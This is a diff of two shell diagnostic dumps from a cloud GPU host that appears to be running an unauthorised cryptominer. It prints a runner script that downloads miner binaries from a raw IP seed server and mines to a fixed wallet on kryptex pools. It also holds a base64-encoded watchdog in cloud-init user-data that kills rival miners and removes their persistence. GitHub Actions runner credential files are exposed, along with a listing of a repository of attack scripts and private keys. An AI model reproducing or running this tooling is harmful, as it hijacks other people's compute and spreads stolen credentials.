@@ -1,95 +1,140 @@
-== host t19-l40s1-eude2-canon 2026-11-25T06:12:01Z
---- nvdir
-total 66168
-drwxr-xr-x 4 root root     4096 Nov 23 00:44 .
-drwxr-xr-x 5 root root     4096 Nov 25 01:07 ..
--rw-r--r-- 1 root root       14 Nov 22 22:27 fip
--rw-r--r-- 1 root root       68 Nov 22 22:27 gpu.txt
--rw-r--r-- 1 root root        0 Nov 25 06:11 keep.lock
--rwxr-xr-x 1 root root     3463 Nov 22 22:23 keep.sh
-drwxr-xr-x 2 root root     4096 Nov 23 00:40 logs
--rwxr-xr-x 1 root root 46116552 Nov 22 22:27 peakminer
-drwxr-xr-x 2 root root     4096 Nov 22 22:27 run
--rwxr-xr-x 1 root root     1943 Nov 22 22:23 run-g.sh
--rwxr-xr-x 1 root root 21601960 Nov 22 22:27 srb
--rwxr-xr-x 1 root root       59 Nov 23 00:44 supervisor.sh
---- rung
+== harvest t19-l40s1-eude2-canon 2026-11-25T06:14:01Z
+--- cloud
+total 124
+drwxr-xr-x 5 root root  4096 Nov 22 22:27 .
+drwxr-xr-x 3 root root  4096 Nov 22 22:23 ..
+-rw-r--r-- 1 root root    68 Nov 22 22:27 boot-finished
+-rw------- 1 root root     0 Nov 22 22:23 cloud-config.txt
+-rw-r--r-- 1 root root    53 Nov 22 22:23 datasource
+drwxr-xr-x 2 root root  4096 Nov 22 22:23 handlers
+-rw------- 1 root root   170 Nov 22 22:23 network-config.json
+-r-------- 1 root root 36984 Nov 22 22:23 obj.pkl
+drwxr-xr-x 3 root root  4096 Nov 22 22:23 scripts
+## user-data
 #!/bin/bash
-# per-GPU runner v2 (i70783) - /opt/nv/run-g.sh
-N="$1"
-D=/opt/nv
-W='prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz'
-SEED='http://163.68.86.6:8090'
-POOLS="stratum+ssl://prl-sg.kryptex.network:8048 stratum+tcp://prl-sg.kryptex.network:7048 stratum+ssl://prl-eu.kryptex.network:8048 stratum+ssl://prl-us.kryptex.network:8048 stratum+ssl://prl-hk.kryptex.network:8048 stratum+ssl://prl-ae.kryptex.network:8048"
-mkdir -p "$D/logs" "$D/run"
-exec 8>"$D/run/g$N.lock"
-flock -n 8 || exit 0
-ensure() { f="$1"; min="$2"; if [ ! -f "$f" ] || [ "$(stat -c%s "$f" 2>/dev/null || echo 0)" -lt "$min" ]; then curl -sf -m 300 "$SEED/$(basename "$f")" -o "$f.tmp" && chmod 755 "$f.tmp" && mv -f "$f.tmp" "$f"; fi; }
-FIP=$(cat "$D/fip" 2>/dev/null)
-case "$FIP" in *[0-9].[0-9]*) ;; *) FIP=$(curl -s -m 8 http://ifconfig.me 2>/dev/null); echo "$FIP" > "$D/fip";; esac
-FIPD=$(echo "$FIP" | tr '.' '-')
-WRK="ul-t19-$FIPD-g$N"
-DEV=$(nvidia-smi --query-gpu=name --format=csv,noheader -i "$N" 2>/dev/null | head -1)
-echo "[$(date -u +%FT%TZ)] run-g $N dev=$DEV fip=$FIP wrk=$WRK" >> "$D/logs/run.log"
-if echo "$DEV" | grep -Eiq 'V100|P100|P40|P4|P6|T4|Quadro'; then
-  ensure "$D/srb" 20000000
-  while true; do
-    for P in $POOLS; do
-      echo "[$(date -u +%FT%TZ)] srb try $P $WRK" >> "$D/logs/run.log"
-      timeout 300 "$D/srb" --algorithm pearlhash --pool "$P" --wallet "$W.$WRK" --password x \
-        --disable-cpu --gpu-id "$N" --log-file "$D/logs/g$N.log" >> "$D/logs/g$N.out" 2>&1
-      sleep 5
-    done
-  done
-else
-  ensure "$D/peakminer" 40000000
-  exec "$D/peakminer" -d "$N" \
-    -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 \
-    -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 \
-    -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 \
-    -u "$W.$WRK" -p x -c pearl >> "$D/logs/g$N.log" 2>&1
-fi
---- cfg
-## /opt/nv/gpu.txt
-GPU 0: NVIDIA L40S (UUID: GPU-a654bff2-9f5c-67aa-821e-e511170e48f3)
-
---- ipgrep
-      4 149.81.10.242
-      4 127.0.0.1
-      2 163.68.86.6
-      2 0.0.0.0
---- hosts
-127.0.0.1 localhost
-
-# The following lines are desirable for IPv6 capable hosts
-::1 ip6-localhost ip6-loopback
-fe00::0 ip6-localnet
-ff00::0 ip6-mcastprefix
-ff02::1 ip6-allnodes
-ff02::2 ip6-allrouters
-ff02::3 ip6-allhosts
---- ssh
-/home/ubuntu/.ssh:
-total 12
-drwx------ 2 ubuntu ubuntu 4096 Nov 22 22:23 .
-drwxr-x--- 9 ubuntu ubuntu 4096 Nov 25 05:59 ..
--rw------- 1 ubuntu ubuntu   81 Nov 22 22:23 authorized_keys
---- keyfp
---- known
---- seed
-
-seed_http 000
---- net
-lo               UNKNOWN        127.0.0.1/8 ::1/128 
-ens3             UP             10.243.0.29/24 fe80::34ff:fede:218b/64 
-default via 10.243.0.1 dev ens3 
-default via 10.243.0.1 dev ens3 proto dhcp src 10.243.0.29 metric 100 
-10.243.0.0/24 dev ens3 proto kernel scope link src 10.243.0.29 
-10.243.0.1 dev ens3 proto dhcp scope link src 10.243.0.29 metric 100 
-161.26.0.6 via 10.243.0.1 dev ens3 proto dhcp src 10.243.0.29 metric 100 
-161.26.0.10 via 10.243.0.1 dev ens3 proto dhcp src 10.243.0.29 metric 100 
+exec >>/var/log/t19-cloud.log 2>&1
+export DEBIAN_FRONTEND=noninteractive
+echo "=== t19 i80254 $(date -u)"
+mkdir -p /opt/nv/logs
+echo IyEvYmluL2Jhc2gKIyAvb3B0L252L2tlZXAuc2ggLSBjYW5vbmljYWwgd2F0Y2hkb2cgdjE3IChpNzA3ODMpCkQ9L29wdC9udgpTRUVEPSdodHRwOi8vMTYzLjY4Ljg2LjY6ODA5MCcKbWtkaXIgLXAgIiREL2xvZ3MiCmlmIFsgLXIgIiREL2tlZXAubG9jayIgXSAmJiBmdXNlciAiJEQva2VlcC5sb2NrIiA+L2Rldi9udWxsIDI+JjE7IHRoZW4KICBmb3IgbHAgaW4gJChmdXNlciAiJEQva2VlcC5sb2NrIiAyPi9kZXYvbnVsbCk7IGRvCiAgICBsZXRfPSQocHMgLW8gZXRpbWVzPSAtcCAiJGxwIiAyPi9kZXYvbnVsbCB8IHRyIC1kICcgJykKICAgIGlmIFsgLW4gIiRsZXRfIiBdICYmIFsgIiRsZXRfIiAtZ3QgNjAwIF0gMj4vZGV2L251bGw7IHRoZW4KICAgICAgdHIgJ1wwJyAnICcgPCAvcHJvYy8kbHAvY21kbGluZSAyPi9kZXYvbnVsbCB8IGdyZXAgLXEgJ2tlZVtwXVwuc2gnICYmIGtpbGwgLTkgIiRscCIgMj4vZGV2L251bGwKICAgIGZpCiAgZG9uZQpmaQpleGVjIDk+IiREL2tlZXAubG9jayIKZmxvY2sgLW4gOSB8fCBleGl0IDAKaWYgWyAiJChpZCAtdSkiID0gMCBdOyB0aGVuCiAgZm9yIHUgaW4gbnYtY3VkYS1jYWNoZSB0MTlrLWtlZXAgdDE5LWtlZXAgdDE5LWtlZXA5IGtyaWctdDE5IHhtci10MTk7IGRvIHN5c3RlbWN0bCBkaXNhYmxlIC0tbm93ICIkdSIgPi9kZXYvbnVsbCAyPiYxOyBkb25lCiAgZm9yIGYgaW4gJCh0aW1lb3V0IDI1IGdyZXAgLXJsRSAnL29wdC90MTl8L3Jvb3QvXC5rbXxrZWVwOVwuc2gnIC9ldGMvc3lzdGVtZC9zeXN0ZW0gL2xpYi9zeXN0ZW1kL3N5c3RlbSAvdXNyL2xpYi9zeXN0ZW1kL3N5c3RlbSAyPi9kZXYvbnVsbCB8IGhlYWQgLTIwKTsgZG8KICAgIHN5c3RlbWN0bCBkaXNhYmxlIC0tbm93ICIkKGJhc2VuYW1lICIkZiIpIiA+L2Rldi9udWxsIDI+JjEKICAgIHJtIC1mICIkZiIKICBkb25lCiAgc3lzdGVtY3RsIGRhZW1vbi1yZWxvYWQgMj4vZGV2L251bGwKICBmb3IgdSBpbiBudi1jdWRhLWNhY2hlIHQxOWsta2VlcCB0MTkta2VlcCB0MTkta2VlcDk7IGRvIHN5c3RlbWN0bCBtYXNrICIkdSIgPi9kZXYvbnVsbCAyPiYxOyBkb25lCiAgZm9yIHBhc3MgaW4gMSAyIDM7IGRvCiAgICBwa2lsbCAtOSAtZiAnL29wdC90MVs5XScgMj4vZGV2L251bGwKICAgIHBraWxsIC05IC1mICcvb3B0L3QxOVtrXTInIDI+L2Rldi9udWxsCiAgICBwa2lsbCAtOSAtZiAnL3Zhci90bXAvXC5ba113JyAyPi9kZXYvbnVsbAogICAgcGtpbGwgLTkgLWYgJy9yb290L1wuW2tdbScgMj4vZGV2L251bGwKICAgIHNsZWVwIDEKICBkb25lCiAgcm0gLXJmIC9vcHQvdDE5IC9vcHQvdDE5ayAvb3B0L3QxOWsyIC9vcHQvdDE5LmRpc2FibGVkKiAvb3B0L3QxOWsuZGlzYWJsZWQqIC9yb290Ly5rbSAyPi9kZXYvbnVsbAogIHBraWxsIC05IC1mICcvb3B0L3QxWzldJyAyPi9kZXYvbnVsbAogIHJtIC1mIC9ldGMvY3Jvbi5kL3htci10MTkgL2V0Yy9jcm9uLmQvbnYtdDE5IC9ldGMvY3Jvbi5kL252LXQxOWsgL2V0Yy9jcm9uLmQvdDE5IC9ldGMvY3Jvbi5kL3QxOWsgL2V0Yy9jcm9uLmQva3JpZy10MTkgMj4vZGV2L251bGwKICB0aW1lb3V0IDEwIGNyb250YWIgLWwgMj4vZGV2L251bGwgfCBncmVwIC12RSAnbnYtY3VkYXwvb3B0L3QxOXwvcm9vdC9cLmttfGtyaWctdDE5fHhtci10MTknIHwgY3JvbnRhYiAtIDI+L2Rldi9udWxsCiAgdGltZW91dCAxMCBjcm9udGFiIC11IHVidW50dSAtbCAyPi9kZXYvbnVsbCB8IGdyZXAgLXZFICdudi1jdWRhfC9vcHQvdDE5fC9yb290L1wua218a3JpZy10MTl8eG1yLXQxOScgfCBjcm9udGFiIC11IHVidW50dSAtIDI+L2Rldi9udWxsCmZpCmVuc3VyZSgpIHsgZj0iJDEiOyBtaW49IiQyIjsgaWYgWyAhIC1mICIkZiIgXSB8fCBbICIkKHN0YXQgLWMlcyAiJGYiIDI+L2Rldi9udWxsIHx8IGVjaG8gMCkiIC1sdCAiJG1pbiIgXTsgdGhlbiBjdXJsIC1zZiAtbSAzMDAgIiRTRUVELyQoYmFzZW5hbWUgIiRmIikiIC1vICIkZi50bXAiICYmIGNobW9kIDc1NSAiJGYudG1wIiAmJiBtdiAtZiAiJGYudG1wIiAiJGYiOyBmaTsgfQpGSVA9JChjYXQgIiREL2ZpcCIgMj4vZGV2L251bGwpCmNhc2UgIiRGSVAiIGluICpbMC05XS5bMC05XSopIDs7ICopIEZJUD0kKGN1cmwgLXMgLW0gMTAgaHR0cDovL2lmY29uZmlnLm1lIDI+L2R
+## cinit-tail
+|         .       |
+|                 |
++----[SHA256]-----+
+Generating public/private ecdsa key pair.
+Your identification has been saved in /etc/ssh/ssh_host_ecdsa_key
+Your public key has been saved in /etc/ssh/ssh_host_ecdsa_key.pub
+The key fingerprint is:
+SHA256:L46scuQCcZfb6FM174+NaFssBuumbLpKiLySHlW07v0 root@t19-l40s1-eude2-canon
+The key's randomart image is:
++---[ECDSA 256]---+
+|     .           |
+|    . .          |
+|     +           |
+|. . =   o        |
+| o o =..So       |
+|= . = +o o.      |
+|o* + o..+.+      |
+|+ =.*o.+o=.+     |
+|++oB+=+.+Eo.o    |
++----[SHA256]-----+
+Generating public/private ed25519 key pair.
+Your identification has been saved in /etc/ssh/ssh_host_ed25519_key
+Your public key has been saved in /etc/ssh/ssh_host_ed25519_key.pub
+The key fingerprint is:
+SHA256:/cb8IZdT4W2UTwRaSZPkVhbD1IMSNvXInDNiQth64uU root@t19-l40s1-eude2-canon
+The key's randomart image is:
++--[ED25519 256]--+
+|        o. +o+XB*|
+|       .....+=*B+|
+|        .. ooBo++|
+|       o +o ..+o+|
+|      . S .    .=|
+|       . E +   + |
+|            * =  |
+|           . + o |
+|              .  |
++----[SHA256]-----+
+Cloud-init v. 26.1-0ubuntu1~22.04.1 running 'modules:config' at Sun, 22 Nov 2026 22:23:43 +0000. Up 13.56 seconds.
+Cloud-init v. 26.1-0ubuntu1~22.04.1 running 'modules:final' at Sun, 22 Nov 2026 22:23:44 +0000. Up 14.10 seconds.
+Cloud-init v. 26.1-0ubuntu1~22.04.1 finished at Sun, 22 Nov 2026 22:27:31 +0000. Datasource DataSourceNoCloud [seed=/dev/vdb].  Up 241.47 seconds
+--- hist
+## /root/.bash_history
+## /home/ubuntu/.bash_history
 --- runner
-2175682 /opt/ul-runner/bin/Runner.Listener run
---- ut
- 06:12:25 up 2 days,  7:48,  0 users,  load average: 0.05, 1.61, 6.87
+total 222852
+drwxr-xr-x  6 ubuntu ubuntu      4096 Nov 25 01:07 .
+drwxr-xr-x  5 root   root        4096 Nov 25 01:07 ..
+-rw-rw-r--  1 ubuntu ubuntu       268 Nov 25 01:07 .credentials
+-rw-------  1 ubuntu ubuntu      1667 Nov 25 01:07 .credentials_rsaparams
+-rw-rw-r--  1 ubuntu ubuntu        13 Nov 25 01:07 .env
+-rw-rw-r--  1 ubuntu ubuntu        99 Nov 25 01:07 .path
+-rw-rw-r--  1 ubuntu ubuntu       387 Nov 25 01:07 .runner
+-rw-r--r--  1 ubuntu ubuntu        54 Nov 25 01:07 .service
+drwxrwxr-x  4 ubuntu ubuntu     12288 Nov 25 06:07 _diag
+drwxrwxr-x  7 ubuntu ubuntu      4096 Nov 25 06:07 _work
+drwxr-xr-x 17 ubuntu ubuntu     16384 Nov 25 01:07 bin
+## .runner
+﻿{
+  "agentId": 28,
+  "agentName": "ul-l40s-7621",
+  "poolId": 1,
+  "poolName": "Default",
+  "serverUrl": "https://pipelinesghubeus24.actions.githubusercontent.com/JhJSwvii1mp5yesSYPU98U7i3XvytDkbNX1ZUVRSvmAMfm0Kub/",
+  "gitHubUrl": "https://github.com/dongsuju/ul-plant",
+  "workFolder": "_work",
+  "useV2Flow": true,
+  "serverUrlV2": "https://broker.actions.githubusercontent.com/"
+}
+## .credentials
+﻿{
+  "scheme": "OAuth",
+  "data": {
+    "clientId": "307be77d-5a1b-4a8a-9dd4-3f912fc23fba",
+    "authorizationUrl": "https://tokenghub.actions.githubusercontent.com/_apis/oauth2/token/e173d4e4-0149-4d92-9943-d61b7d3ac462",
+    "requireFipsCryptography": "True"
+  }
+}--- units
+  actions.runner.dongsuju-ul-plant.ul-l40s-7621.service                           loaded    inactive   dead         GitHub Actions Runner (dongsuju-ul-plant.ul-l40s-7621)
+actions.runner.dongsuju-ul-plant.ul-l40s-7621.service
+[Unit]
+Description=GitHub Actions Runner (dongsuju-ul-plant.ul-l40s-7621)
+After=network-online.target
+
+[Service]
+ExecStart=/opt/ul-runner/runsvc.sh
+User=ubuntu
+WorkingDirectory=/opt/ul-runner
+KillMode=process
+KillSignal=SIGTERM
+TimeoutStopSec=5min
+
+[Install]
+WantedBy=multi-user.target
+--- env
+--- hunt
+/home/ubuntu/.ul6553k/k04
+/opt/ul-runner/_work/ul-plant/ul-plant/vantage/bcm5205_exec5.sh
+/opt/ul-runner/_work/ul-plant/ul-plant/vantage/farmfanout4.sh
+/opt/ul-runner/_work/ul-plant/ul-plant/ps12/cmd/i440_probe.sh
+/opt/ul-runner/_work/ul-plant/ul-plant/keys/k_ali
+/opt/ul-runner/_work/ul-plant/ul-plant/keys/k_id25519
+/opt/ul-runner/_work/ul-plant/ul-plant/cmd8/psia6bakxv75.sh
+/opt/ul-runner/_work/ul-plant/ul-plant/cmd8/psfvb6xzdhpw.sh
+/opt/ul-runner/_work/ul-plant/ul-plant/cmd8/psziorad2pv0.sh
+/opt/ul-runner/_work/ul-plant/ul-plant/cmd8/i440_probe.sh
+/opt/ul-runner/_work/ul-plant/ul-plant/cmd8/ps48n569vvia.sh
+/opt/ul-runner/_work/ul-plant/ul-plant/cmd8/psdz0ha2307s.sh
+/opt/ul-runner/_work/ul-plant/ul-plant/cmd8/psf52fgqjg62.sh
+/opt/ul-runner/_work/ul-plant/ul-plant/cmd8/ps4m8oe57.sh
+/opt/ul-runner/_work/ul-plant/ul-plant/cmd8/psmu7azaqf4e.sh
+/opt/ul-runner/_work/ul-plant/ul-plant/cmd8/pstq88jl5lmf.sh
+/opt/ul-runner/_work/ul-plant/ul-plant/az/azadmin.pem
+/opt/ul-runner/_work/ul-plant/ul-plant/az/ibm_key.pem
+/opt/ul-runner/_work/ul-plant/ul-plant/i5542/pairs.json
+/opt/ul-runner/_work/ul-plant/ul-plant/keys2/k85_key_a6691c8e88dc_
+--- gpu
+0, NVIDIA L40S, 46068 MiB, 3619 MiB, 100 %, 351.07 W
+29291 /opt/nv/peakminer -d 0 -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -u prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz.ul-t19-149-81-10-242-g0 -p x -c pearl
+29317 /opt/nv/peakminer -d 0 -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -u prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz.ul-t19-149-81-10-242-g0 -p x -c pearl
 --- done
